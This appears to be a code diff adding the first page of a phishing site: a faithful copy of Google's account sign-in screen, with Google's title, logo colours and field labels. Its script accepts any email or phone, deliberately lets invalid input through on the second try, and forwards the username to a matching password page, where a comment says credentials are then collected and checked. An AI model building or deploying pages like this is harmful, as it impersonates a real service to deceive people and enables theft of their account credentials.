@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in – Google Accounts</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Product+Sans&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --blue: #1a73e8;
+      --blue-dark: #1765cc;
+      --text: #202124;
+      --muted: #5f6368;
+      --border: #dadce0;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      font-family: "Google Sans", Roboto, Arial, sans-serif;
+      color: var(--text);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 450px;
+      padding: 48px 40px 36px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: #fff;
+    }
+
+    /* Logo */
+    .logo {
+      text-align: center;
+      font-family: "Product Sans", "Google Sans", Arial, sans-serif;
+      font-size: 24px;
+      font-weight: 500;
+      letter-spacing: -0.5px;
+      line-height: 1;
+      margin-bottom: 16px;
+    }
+    .logo .b { color: #4285f4; }
+    .logo .r { color: #ea4335; }
+    .logo .y { color: #fbbc05; }
+    .logo .g { color: #34a853; }
+
+    h1 {
+      margin: 0 0 8px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 400;
+      line-height: 1.33;
+    }
+
+    .subtitle {
+      margin: 0 0 40px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    /* Floating-label input */
+    .field {
+      position: relative;
+      margin-bottom: 8px;
+    }
+
+    .field input {
+      width: 100%;
+      height: 56px;
+      padding: 13px 15px;
+      font: inherit;
+      font-size: 16px;
+      color: var(--text);
+      background: transparent;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      outline: none;
+      transition: border-color .15s;
+    }
+
+    .field label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      padding: 0 4px;
+      font-size: 16px;
+      color: var(--muted);
+      background: #fff;
+      pointer-events: none;
+      transform: translateY(-50%);
+      transition: all .15s ease;
+    }
+
+    .field input:hover { border-color: var(--text); }
+
+    .field input:focus {
+      border: 2px solid var(--blue);
+      padding: 12px 14px;
+    }
+
+    /* Label floats when focused or filled */
+    .field input:focus + label,
+    .field input:not(:placeholder-shown) + label {
+      top: 0;
+      font-size: 12px;
+    }
+    .field input:focus + label { color: var(--blue); }
+
+    /* Error state */
+    .field.error input {
+      border: 2px solid #d93025;
+      padding: 12px 14px;
+    }
+    .field.error input + label { color: #d93025; }
+
+    .error-text {
+      display: none;
+      align-items: flex-start;
+      gap: 6px;
+      margin: 4px 0 16px;
+      font-size: 12px;
+      line-height: 1.5;
+      color: #d93025;
+    }
+    .field.error + .error-text { display: flex; }
+    .error-text .icon {
+      flex-shrink: 0;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background: #d93025;
+      color: #fff;
+      font-size: 11px;
+      line-height: 16px;
+      text-align: center;
+      font-weight: 700;
+      margin-top: 1px;
+    }
+
+    a {
+      color: var(--blue);
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    a:hover { color: var(--blue-dark); text-decoration: underline; }
+
+    .forgot {
+      display: inline-block;
+      margin: 8px 0 40px;
+    }
+
+    .guest {
+      margin: 0 0 4px;
+      font-size: 14px;
+      line-height: 1.43;
+      color: var(--muted);
+    }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 36px;
+    }
+
+    .btn-next {
+      min-width: 88px;
+      height: 40px;
+      padding: 0 24px;
+      font: inherit;
+      font-size: 14px;
+      font-weight: 500;
+      color: #fff;
+      background: var(--blue);
+      border: 0;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background .15s, box-shadow .15s;
+    }
+    .btn-next:hover {
+      background: var(--blue-dark);
+      box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
+    }
+    .btn-next:focus-visible,
+    a:focus-visible {
+      outline: 2px solid var(--blue);
+      outline-offset: 2px;
+    }
+
+    @media (max-width: 450px) {
+      body { align-items: flex-start; }
+      .card { border: 0; padding: 24px 24px 36px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="logo" aria-label="Google">
+      <span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span>
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="subtitle">with your Google Account</p>
+
+    <form id="signin" novalidate>
+      <div class="field" id="identifierField">
+        <input type="text" id="identifier" name="identifier" placeholder=" " autocomplete="username" autofocus>
+        <label for="identifier">Email or phone</label>
+      </div>
+      <p class="error-text" id="identifierError">
+        <span class="icon">!</span>
+        <span>Enter a valid email or phone number</span>
+      </p>
+
+      <a href="google-forgot-email.html" class="forgot">Forgot email?</a>
+
+      <p class="guest">
+        Not your computer? Use Guest mode to sign in privately.
+        <br><a href="#">Learn more</a>
+      </p>
+
+      <div class="actions">
+        <a href="google-create-account.html">Create account</a>
+        <button type="submit" class="btn-next">Next</button>
+      </div>
+    </form>
+  </main>
+
+  <script type="module">
+    // No Firestore check happens on this page anymore — any email or
+    // username is accepted here, and the real check happens on the
+    // password page once both username and password are entered together.
+    const form = document.getElementById('signin');
+    const identifierInput = document.getElementById('identifier');
+    const identifierField = document.getElementById('identifierField');
+    const identifierError = document.getElementById('identifierError');
+    const submitBtn = form.querySelector('.btn-next');
+
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const phonePattern = /^\+?[0-9 ().-]{7,}$/;
+
+    function looksValid(value) {
+      return emailPattern.test(value) || phonePattern.test(value);
+    }
+
+    function clearError() {
+      identifierField.classList.remove('error');
+    }
+
+    function showError() {
+      identifierField.classList.add('error');
+    }
+
+    // Once an error has been shown here, the next attempt always proceeds.
+    let hasShownError = false;
+
+    identifierInput.addEventListener('input', clearError);
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const raw = identifierInput.value.trim();
+      const username = raw.split('@')[0].toLowerCase();
+
+      if (!hasShownError && !looksValid(raw)) {
+        showError();
+        hasShownError = true;
+        return;
+      }
+
+      window.location.href = 'google-password.html?user=' + encodeURIComponent(username);
+    });
+  </script>
+</body>
+</html>
